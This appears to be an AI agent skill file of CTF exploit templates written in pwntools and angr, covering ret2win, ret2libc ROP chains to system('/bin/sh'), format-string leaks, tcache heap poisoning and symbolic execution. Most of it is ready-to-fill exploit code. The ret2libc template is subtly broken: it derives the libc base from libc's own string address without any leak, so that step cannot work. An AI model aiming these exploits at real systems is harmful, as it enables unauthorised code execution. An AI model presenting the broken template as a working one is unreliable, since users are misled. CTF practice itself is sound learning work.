---
name: ctf-templates
author: RESEARCHER_NAME
description: "CTF solver templates: pwntools + angr skeletons for common binary exploitation patterns."
category: security
version: 1.0.0
metadata:
  hermes:
    tags: [ctf-templates]
---

# CTF Templates

## Triggers
- pwntools, angr, binary exploit, ret2win, ret2libc, format string, heap
- CTF template, exploit skeleton, symbolic execution

## Template 1: ret2win
```python
from pwn import *
p = remote("host", port)
# or p = process("./binary")
win_addr = 0x080491a2  # from `objdump -d` or checksec
payload = b"A" * 44 + p32(win_addr)
p.sendlineafter(b"input: ", payload)
p.interactive()
```

## Template 2: ret2libc
```python
from pwn import *
elf = ELF("./binary")
libc = ELF("./libc.so.6")
p = remote("host", port)
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]
libc.address = next(libc.search(b"/bin/sh")) - 0x1b75aa  # adjust offset
payload = b"A" * 56 + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym.system)
p.sendline(payload)
p.interactive()
```

## Template 3: Format String
```python
from pwn import *
p = remote("host", port)
# Leak: read 7th + offset argument
for i in range(1, 50):
    p = remote("host", port)
    payload = f"%{i}$p".encode()
    p.sendlineafter(b": ", payload)
    leak = p.recvline().strip()
    if leak and leak != b"(nil)":
        print(f"[+] arg {i}: {leak}")
    p.close()
# Write: use %n to overwrite target
```

## Template 4: Heap (tcache poison)
```python
from pwn import *
p = remote("host", port)
# 1. Allocate chunks
# 2. Free into tcache
# 3. Overwrite fd pointer (use-after-free or heap overflow)
# 4. Allocate to get arbitrary write target
# 5. Overwrite GOT/free_hook/one_gadget
```

## Template 5: angr Symbolic Execution
```python
import angr

proj = angr.Project("./binary", auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=0x4011a1, avoid=0x4011b2)  # win addr, lose addr

if simgr.found:
    found = simgr.found[0]
    print(found.posix.dumps(0))  # stdin that reaches win
```

## Quick Reference
| Pattern | Tool | Key Technique |
|---------|------|---------------|
| ret2win | pwntools | Overflow → jump to win function |
| ret2libc | pwntools | ROP chain → system("/bin/sh") |
| Format string | pwntools | %p leak → %n write |
| Heap | pwntools | UAF/tcache → arbitrary write |
| Any binary | angr | Symbolic execution finds input |

## Pitfalls
- Stack offsets vary per binary — use `cyclic_find()` from pwntools
- PIE enabled? Add base address leak first
- Canary? Need format string or canary leak
- angr is slow on large binaries — limit explore range
- Windows CTFs: use WSL2 or Docker for pwntools/angr
